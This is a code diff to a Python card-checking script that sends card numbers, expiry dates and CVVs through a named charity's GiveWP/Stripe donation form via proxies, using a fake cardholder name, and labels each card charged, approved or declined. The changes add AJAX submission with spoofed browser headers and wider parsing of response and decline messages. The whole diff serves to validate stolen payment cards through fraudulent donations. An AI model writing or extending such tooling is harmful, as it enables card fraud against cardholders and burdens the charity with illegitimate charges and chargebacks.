@@ -4,13 +4,18 @@ Uses WordPress Give + Stripe. Flow: donate page -> load gateway -> payment_metho
 Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
 """
 
+import json
 import re
 import uuid
 import asyncio
+import logging
+from typing import Optional
 from urllib.parse import urlencode
 from concurrent.futures import ThreadPoolExecutor
 
 import httpx
+
+logger = logging.getLogger(__name__)
 
 # Gate config
 DONATE_URL = "https://www.brightercommunities.org/donate-form/"
@@ -49,6 +54,9 @@ DECLINE_PATTERNS = [
     r"there was an issue with your donation",
     r"couldn't confirm your payment",
     r"check your card details",
+    r"tokenization\s+(?:error|failed)",
+    r"payment\s+method\s+(?:invalid|failed)",
+    r"stripe\s+(?:error|failed)",
 ]
 
 SUCCESS_PATTERNS = [
@@ -120,21 +128,68 @@ def _parse_stripe_key(html: str) -> tuple:
     return key, acc
 
 
+def _parse_json_response(text: str) -> Optional[tuple]:
+    """
+    Parse GiveWP AJAX JSON response.
+    Returns (status, response_msg) or None if not JSON.
+    """
+    text = (text or "").strip()
+    if not text or not (text.startswith("{") or text.startswith("[")):
+        return None
+    try:
+        data = json.loads(text)
+    except json.JSONDecodeError:
+        return None
+    if not isinstance(data, dict):
+        return None
+    success = data.get("success") is True
+    inner = data.get("data") or {}
+    if isinstance(inner, dict):
+        err = inner.get("error") or inner.get("message") or inner.get("msg") or ""
+        redirect = inner.get("redirect") or ""
+    else:
+        err = str(inner) if inner else ""
+        redirect = ""
+    err_lower = (err or "").lower()
+    redirect_lower = (redirect or "").lower()
+    if success:
+        if "thank" in redirect_lower or "confirmation" in redirect_lower or "receipt" in redirect_lower:
+            return "charged", "DONATION_SUCCESSFUL"
+        if redirect:
+            return "charged", "DONATION_SUCCESSFUL"
+        return "charged", "DONATION_SUCCESSFUL"
+    if err:
+        for pat in DECLINE_PATTERNS:
+            if re.search(pat, err_lower):
+                msg = err.upper().replace(" ", "_")[:60]
+                return "declined", msg
+        return "declined", err.upper().replace(" ", "_")[:60]
+    # success=False but no error message - try top-level
+    top_err = data.get("error") or data.get("message") or ""
+    if top_err:
+        return "declined", str(top_err).upper().replace(" ", "_")[:60]
+    return None
+
+
 def _parse_final_response(html: str) -> tuple:
     """
-    Parse final donation form response.
+    Parse final donation form response (HTML or JSON).
     Returns (status, response_msg) where status is charged|approved|declined|error
     """
-    html_lower = html.lower()
-    # Check for success
+    # 1. Try JSON first (GiveWP AJAX)
+    json_result = _parse_json_response(html)
+    if json_result:
+        return json_result
+
+    html_lower = (html or "").lower()
+    # 2. Check for success in HTML
     for pat in SUCCESS_PATTERNS:
         if re.search(pat, html_lower):
             return "charged", "DONATION_SUCCESSFUL"
-    # Check for decline
+    # 3. Check for decline
     for pat in DECLINE_PATTERNS:
         m = re.search(pat, html_lower, re.I)
         if m:
-            # Try to get the full error message
             err_div = re.search(
                 r'give_error[^>]*>.*?<p[^>]*>.*?([^<]+(?:declined|error|issue)[^<]*)',
                 html,
@@ -144,7 +199,7 @@ def _parse_final_response(html: str) -> tuple:
                 msg = re.sub(r"\s+", " ", err_div.group(1)).strip()[:80]
                 return "declined", msg.upper().replace(" ", "_")
             return "declined", "CARD_DECLINED"
-    # Try to extract error from give_error div
+    # 4. Try to extract error from give_error div
     err = re.search(
         r'<div[^>]*class="[^"]*give_error[^"]*"[^>]*>.*?<p[^>]*>\s*<strong>[^<]*</strong>\s*([^<]+)',
         html,
@@ -153,7 +208,26 @@ def _parse_final_response(html: str) -> tuple:
     if err:
         msg = re.sub(r"\s+", " ", err.group(1)).strip()[:80]
         return "declined", msg.upper().replace(" ", "_")
-    # Generic
+    # 5. Try Stripe error in JSON-like fragments
+    stripe_err = re.search(r'"message"\s*:\s*"([^"]+)"', html, re.I)
+    if stripe_err:
+        msg = stripe_err.group(1).upper().replace(" ", "_")[:60]
+        if any(x in msg.lower() for x in ("declined", "invalid", "incorrect", "expired")):
+            return "declined", msg
+        return "error", msg
+    # 6. Generic - try to extract any error-like text
+    err_snippet = re.search(r'(?:error|declined|failed)[:\s]+["\']?([^"\'<>\n]{10,80})', html_lower)
+    if err_snippet:
+        return "error", err_snippet.group(1).upper().replace(" ", "_")[:50]
+    # 7. Empty/short response
+    if not html or len(html.strip()) < 20:
+        return "error", "EMPTY_RESPONSE"
+    # 8. Try to extract JSON error/message for debugging
+    for key in ("error", "message", "msg", "data"):
+        m = re.search(rf'"{key}"\s*:\s*"([^"]{{10,80}})"', html, re.I)
+        if m:
+            return "error", m.group(1).upper().replace(" ", "_")[:55]
+    logger.debug("UNKNOWN_RESPONSE - raw snippet: %s", (html or "")[:500])
     return "error", "UNKNOWN_RESPONSE"
 
 
@@ -270,7 +344,7 @@ def _check_stripe_charge_sync(card: str, mes: str, ano: str, cvv: str, proxy: st
             if not pm_id or not pm_id.startswith("pm_"):
                 return {"status": "error", "response": "NO_PAYMENT_METHOD_ID"}
 
-            # 5. Submit donation form
+            # 5. Submit donation form - try admin-ajax (GiveWP AJAX) first, then donate page
             donate_data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": form_prefix,
@@ -295,8 +369,35 @@ def _check_stripe_charge_sync(card: str, mes: str, ano: str, cvv: str, proxy: st
                 "card_name": "MAXINE HARRY",
                 "give_action": "purchase",
                 "give-gateway": "stripe",
+                "action": "give_process_donation",
+                "give_ajax": "true",
             }
 
+            ajax_headers = {
+                "User-Agent": USER_AGENT,
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "Origin": "https://www.brightercommunities.org",
+                "Referer": DONATE_URL,
+                "X-Requested-With": "XMLHttpRequest",
+            }
+
+            # 5a. Try admin-ajax.php (GiveWP AJAX - returns JSON)
+            try:
+                ajax_resp = client.post(
+                    AJAX_URL,
+                    data=donate_data,
+                    headers=ajax_headers,
+                )
+                if ajax_resp.status_code == 200 and ajax_resp.text.strip():
+                    status, msg = _parse_final_response(ajax_resp.text)
+                    if status != "error" or msg != "UNKNOWN_RESPONSE":
+                        return {"status": status, "response": msg}
+            except Exception:
+                pass
+
+            # 5b. Fallback: POST to donate page (may redirect to thank-you)
+            donate_data.pop("action", None)
+            donate_data.pop("give_ajax", None)
             final_resp = client.post(
                 DONATE_URL,
                 params={"payment-mode": "stripe", "form-id": form_id},
